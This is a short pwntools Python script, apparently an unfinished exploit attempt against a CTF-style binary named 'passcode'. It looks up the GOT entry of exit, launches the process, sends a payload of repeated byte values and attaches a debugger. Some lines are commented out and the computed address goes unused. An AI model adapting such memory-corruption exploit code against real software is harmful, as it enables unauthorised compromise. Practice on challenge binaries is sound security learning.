from pwn import *

exe = context.binary = ELF('passcode')
exitaddr = exe.got['exit']

io = exe.process()
print(io.recvline())
print(io.recv(10))
#io.recvuntil(b'enter your name : ')
payload = (b'\xe6\x28\x05\x00' * 12) + (b'\xc9\x07\xcc\x00' * 12)
print(payload)

gdb.attach(io)
io.sendline(payload)
#io.recvline()
#io.recvuntil(b'enter passcode1 : ')